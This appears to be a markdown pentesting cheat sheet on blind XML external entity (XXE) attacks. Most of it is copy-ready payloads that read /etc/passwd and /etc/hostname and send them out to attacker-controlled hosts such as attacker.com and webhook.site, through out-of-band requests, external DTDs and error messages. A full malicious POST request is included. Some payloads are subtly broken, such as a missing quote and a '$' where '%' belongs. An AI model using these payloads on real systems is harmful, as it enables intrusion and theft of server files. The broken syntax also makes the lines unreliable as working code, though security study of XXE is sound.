#### Blind XXE vulnerabilities
Blind XXE means the payload mat reach the back-end application but the response may not be seen to validate the vulnerability is there or not.

To Detect and exploit the vulnerability we need to use **OAST(Out of band interaction Techniques).**
There are two broad ways in which you can find and exploit blind XXE vulnerabilities:
> You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.
> 
> You can trigger XML parsing errors in such a way that the error messages contain sensitive data.

### Detecting blind XXE using out-of-band (OAST) techniques
The procedure is same as the [Blind SSRF](https://github.com/cmos1-VC/Web-App_Pentesting/blob/main/SSRF_CHEAT_SHEAT.md#blind-ssrf-vulnerabilities).

payload:-
````
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> ]>
````
Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. 

In this situation, you might be able to use XML parameter entities instead.

#### XML ENTITIES

These are special kind of XML entities that can only be referenced within DTD.

**Reference**
````
<!ENTITY % paramentity "my test value">
````
**Implementation**
````
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com"> %xxe; ]>
````

### [Exploiting blind XXE to exfiltrate data out-of-band](https://shreyapohekar.com/blogs/blind-xxe-attacks-out-of-band-interaction-techniques-oast-to-exfilterate-data/)
This is used when the attacker really wants to extract the sensitive data.
````
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://webhook.site/b16e2541-f40a-4641-9e12-286439217267/?x=%file;'>">
%eval;
%exfil
````
Here parameter entity is used to exfilterate data. This is an example of entity defined within an entity. 
The parameterised entity %file is referenced inside %eval. So the content of /etc/hostname is appended as the part of request and is sent to attacker.
When the request is received, we’ll be able to view the hostname.

Hostnames can be obtained using this technique but what about the /etc/passwd type of files which contain lots of data and can be blocked 
due to their size and other charecter constraines? 

Let’s look at how that can be done.

Create an extternal DTD on http://your_controlled_domain.com/xxe.dtd
````
<!ENTITY % all "<!ENTITY &#x25; req SYSTEM 'https://you_controlled_domain/buro-collaborator-client/%file;'>">
````

````
POST /vuln
Host: 6.9.6.9
User-Agent: ....
Content-Length: 123

<?xml version=1.0"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
<!-- load dtd file -->
%dtd;
<!-- Resolve the nested external entity -->
%all;
<!-- resolve the external entity req along with file reference -->
%req;
]>

<app>
<user>foo</user>
<pass>bar</pass>
````
This is gonna send a base64 encoded /etc/passwd along with the get request. It can be further decoded to obtain the original file

If the http response is showing error due to load of the file u can change the DTD file to this

````
<!ENTITY $ file SYSTEM "file:///etc/passwd">
<!ENTITY % req "<!ENTITY abc SYSTEM 'ftp://x.x.x.x:1212/%file; '>">
````
#### [Exploiting blind XXE by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind)

#### [Exfilterating the .xml files](https://shreyapohekar.com/blogs/blind-xxe-attacks-out-of-band-interaction-techniques-oast-to-exfilterate-data/)

### Exploiting blind XXE to retrieve data via error messages
Another way is to craft a payload that creates an error and by using that error we may get more information 
(or) try obtaining the required file through that error

1. You can create this by asking for an non-existence file to fetch and while the backend does that also create the required file 
 u want to get like"/etc/passwd" 
 ````
 <!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
````
2. Now the above malicious payload makes the back-end to try fetch the non-existence file and while doing we will get an error
 and the required file("/etc/passwd or %file) which we gave in the URI 
 


### References
https://portswigger.net/web-security/xxe/blind.

https://shreyapohekar.com/blogs/blind-xxe-attacks-out-of-band-interaction-techniques-oast-to-exfilterate-data/.

https://dzone.com/articles/xml-external-entity-xxe-limitations.



